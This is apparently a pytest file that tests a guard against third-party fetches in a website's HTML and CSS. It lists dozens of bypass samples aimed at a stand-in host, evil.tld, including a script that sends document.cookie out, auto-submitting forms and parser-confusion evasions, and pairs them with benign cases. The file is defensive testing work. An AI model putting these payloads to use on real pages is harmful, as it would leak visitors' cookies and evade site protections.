"""The guard has been found incomplete five times. It is tested by its bypasses."""
import pytest

from conftest import external_bases, stylesheet_hosts, third_party_hosts

SELF = {"genai-security-project.github.io"}

MUST_CATCH = {
    "base href": '<base href="https://evil.tld/"><img src="logo.png">',
    "inline script body": '<script>fetch("https://evil.tld/b?"+document.cookie)</script>',
    "svg use href": '<svg><use href="https://evil.tld/s.svg#x"></use></svg>',
    "svg image href": '<svg><image href="https://evil.tld/i.png"/></svg>',
    "meta refresh": '<meta http-equiv="refresh" content="0;url=https://evil.tld/">',
    "css image-set": '<style>b{background:image-set("https://evil.tld/a.png" 1x)}</style>',
    "tab inside the scheme": '<img src="ht\tps://evil.tld/x.png">',
    "second attribute on one tag":
        '<video src="//genai-security-project.github.io/a.mp4" poster="//evil.tld/b.jpg">',
    "anchor ping": '<a href="/local" ping="https://evil.tld/beacon">x</a>',
    "unquoted src": "<img src=//evil.tld/x.png>",
    "srcset second url": '<img srcset="/a.png 1x, //evil.tld/b.png 2x">',
    "link stylesheet": '<link rel="stylesheet" href="https://evil.tld/s.css">',
    "iframe": '<iframe src="https://evil.tld/f"></iframe>',
    "object data": '<object data="https://evil.tld/o"></object>',
    "auto-submitted form":
        '<form id="f" action="https://evil.tld/collect"></form>'
        '<script>document.getElementById("f").submit()</script>',
    "input formaction": '<input type="submit" formaction="https://evil.tld/go">',
    "anchor rel=prefetch": '<a rel="prefetch" href="https://evil.tld/x">y</a>',
    "anchor rel=preconnect": '<a rel="preconnect" href="https://evil.tld/">y</a>',
    "entity-encoded scheme": '<img src="&#104;ttps://evil.tld/x.png">',
    "uppercase scheme": '<img src="HTTPS://evil.tld/x.png">',
    # HTML honors a self-closing slash only on void and foreign elements, so a
    # browser ignores it here and runs the body. Python's parser reports these
    # through a different handler, which is how an earlier version missed them.
    "self-closed script with a body": '<script/>fetch("https://evil.tld/x")</script>',
    "self-closed style with a body":
        '<style/>body{background:url(https://evil.tld/z.png)}</style>',
    # A browser closes on either of these, tokenizing and discarding what it finds
    # before the bracket. Matching only whitespace there loses the whole body.
    "closing tag carrying an attribute":
        '<script>fetch("https://evil.tld/a")</script data-x="y"><p>after</p>',
    "closing tag with a slash": '<script>fetch("https://evil.tld/b")</script/><p>after</p>',
    # A comment delimiter inside a script body is text, not a comment. Scanning for
    # comments separately from elements let this one span swallow the next script.
    "comment delimiter inside a script body":
        '<script>var x = "<!--"</script><script>fetch("https://evil.tld/c")</script>'
        '<p>trailing --></p>',
    # No closing tag, so the element owns the rest of the document and runs.
    "unclosed script at end of input": '<p>x</p><script>fetch("https://evil.tld/d")',
    "closing tag with no bracket": '<script>fetch("https://evil.tld/e")</script',
    # The legacy idiom for hiding script from very old parsers. It still executes.
    "script wrapped in comment delimiters":
        '<script><!--\nfetch("https://evil.tld/f")\n//--></script>',
    # CSS in the markup is still CSS. Routing an inline style through the script
    # matcher, which requires an explicit scheme, dropped every protocol-relative
    # url() a style block carries. The rendered landing page ships one such block.
    "inline style, protocol-relative url":
        '<style>a{background:url(//evil.tld/x.png)}</style>',
    "inline style, protocol-relative import":
        '<style>@import url(//evil.tld/s.css);</style>',
    "inline style, font-face src": '<style>@font-face{src:url(//evil.tld/f.woff2)}</style>',
    # A comment delimiter inside an attribute value is text, and a browser also
    # closes a comment on --!>. Reading either wrong blanks every element after it.
    "comment delimiter inside an attribute":
        '<a title="<!--">x</a><script>fetch("https://evil.tld/g")</script>',
    "comment closed with a bang":
        '<!-- x --!><script>fetch("https://evil.tld/h")</script>',
    # The shipped theme stylesheet declares content:"/*" and content:"*/". Reading
    # those as a comment blanked the span between them, where a url() could hide.
    "url between comment delimiters held in css strings":
        '<style>a{content:"/*"}b{background:url(//evil.tld/i.png)}c{content:"*/"}</style>',
    # An apostrophe in an unquoted attribute value is a character, not a delimiter.
    # Treating it as one consumed the rest of the document.
    "stray apostrophe in an unquoted attribute":
        '<div data-x=it\'s></div><style>a{background:url(//evil.tld/j.png)}</style>',
    # Markup a script writes fetches like any other markup.
    "markup written by a script":
        '<script>document.write(\'<img src="//evil.tld/k.png">\')</script>',
}

MUST_IGNORE = {
    "prose anchor": '<p>See <a href="https://github.com/owasp/x">the repo</a>.</p>',
    "blockquote cite": '<blockquote cite="https://example.org/z">q</blockquote>',
    "self-hosted asset": '<img src="https://genai-security-project.github.io/a.png">',
    "relative asset": '<img src="assets/a.png"><link rel="stylesheet" href="s.css">',
    "javascript line comment": "<script>\n// see https not a url\nvar x=1;\n</script>",
    "svg namespace": '<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>',
    "anchor rel=noopener": '<a href="https://github.com/x" rel="noopener">r</a>',
    "anchor rel=edit": '<a href="https://github.com/x/edit" rel="edit">e</a>',
    # Commented-out markup never runs. Flagging it is the noise that gets a guard
    # switched off, and old tracking code left in a comment is a real pattern.
    "script inside an html comment":
        '<!-- <script>fetch("https://evil.tld/x")</script> --><p>hi</p>',
    "style inside an html comment":
        '<!-- <style>@import "https://evil.tld/i.css";</style> -->',
    "inline style that is self-hosted":
        '<style>a{background:url(//genai-security-project.github.io/a.png)}</style>',
    "inline style that is relative": '<style>a{background:url(../img/a.png)}</style>',
    "url inside a real css comment":
        '<style>/* url(//evil.tld/x.png) */a{color:red}</style>',
    "division that is not a url": '<script>var r = a//b\nvar q = c/d</script>',
    "markup a script writes to our own host":
        '<script>document.write(\'<img src="//genai-security-project.github.io/a.png">\')</script>',
    # An unterminated comment consumes the rest of the document, so nothing after
    # it runs and nothing after it should be scanned.
    "script inside an unterminated comment":
        '<!-- <script>fetch("https://evil.tld/x")</script>',
    "html comment": "<!-- https://evil.tld/x --><p>ok</p>",
}

CSS_CATCH = {
    "url absolute": "a{background:url(https://evil.tld/x.png)}",
    "url protocol-relative": "a{background:url(//evil.tld/x.png)}",
    "import string": '@import "https://evil.tld/s.css";',
    "import url": "@import url(//evil.tld/s.css);",
    # CSS tokenizes the at-keyword without needing whitespace after it.
    "import with no space": '@import"https://evil.tld/t.css";',
    "image-set": 'a{background:image-set("https://evil.tld/a.png" 1x)}',
    "font-face src": "@font-face{src:url(https://evil.tld/f.woff2)}",
}

CSS_IGNORE = {
    "data uri holding an svg":
        "a{background:url(\"data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'/>\")}",
    "licence comment": "/* icons from https://fontawesome.com */a{color:red}",
    "self host": "a{background:url(https://genai-security-project.github.io/a.png)}",
    "relative": "a{background:url(../img/a.png)}",
}


@pytest.mark.parametrize("markup", MUST_CATCH.values(), ids=list(MUST_CATCH))
def test_every_known_bypass_is_caught(markup):
    assert "evil.tld" in third_party_hosts(markup, SELF)


@pytest.mark.parametrize("markup", MUST_IGNORE.values(), ids=list(MUST_IGNORE))
def test_prose_and_self_hosted_references_are_not_fetches(markup):
    assert third_party_hosts(markup, SELF) == set()


@pytest.mark.parametrize("css", CSS_CATCH.values(), ids=list(CSS_CATCH))
def test_stylesheet_fetches_are_caught(css):
    assert "evil.tld" in stylesheet_hosts(css, SELF)


@pytest.mark.parametrize("css", CSS_IGNORE.values(), ids=list(CSS_IGNORE))
def test_stylesheet_non_fetches_are_ignored(css):
    """A data: payload and a licence banner carry URLs that fetch nothing.

    Flagging them is what makes a team switch a guard off.
    """
    assert stylesheet_hosts(css, SELF) == set()


def test_a_self_closed_script_owns_everything_up_to_the_closing_tag():
    """This reads as a false positive and is not one.

    A browser ignores the self-closing slash on script, so the element stays open
    and the markup between it and the next closing tag is the script's raw text.
    Treating that text as script text is what the browser does. Two earlier
    versions of this guard traded between missing the body and sweeping the rest
    of the document, so the behavior is pinned here rather than left to whoever
    reads the parser next.
    """
    markup = '<script src="/a.js"/><p>https://third.example.com</p><div></script></div>'
    assert third_party_hosts(markup, SELF) == {"third.example.com"}


def test_an_unclosed_script_owns_the_rest_of_the_document():
    """Reads as a false positive, is not one, and is the other half of the case above.

    With no end tag the element runs to the end of input, so the markup after it is
    script text a browser executes rather than prose it renders. An earlier attempt
    dropped the body entirely when no end tag was present, which hid a real fetch.
    """
    markup = '<script src="/a.js"/><p>https://third.example.com</p>'
    assert third_party_hosts(markup, SELF) == {"third.example.com"}


def test_a_url_ending_at_a_tag_boundary_keeps_its_host_intact():
    """The host must not swallow the angle bracket that follows it."""
    assert third_party_hosts('<script>u="https://evil.tld"</script>', SELF) == {"evil.tld"}


def test_a_base_element_is_named_by_its_own_check():
    """base rewrites resolution for the whole page, so every relative URL leaves it.

    No host appears in any other attribute afterwards, which is why a host-matching
    guard can never see it.
    """
    assert external_bases('<base href="https://evil.tld/"><img src="logo.png">')


def test_a_namespace_declaration_cannot_smuggle_a_fetch():
    markup = '<svg xmlns="http://www.w3.org/2000/svg"><use href="https://evil.tld/s#x"/></svg>'
    assert "evil.tld" in third_party_hosts(markup, SELF)
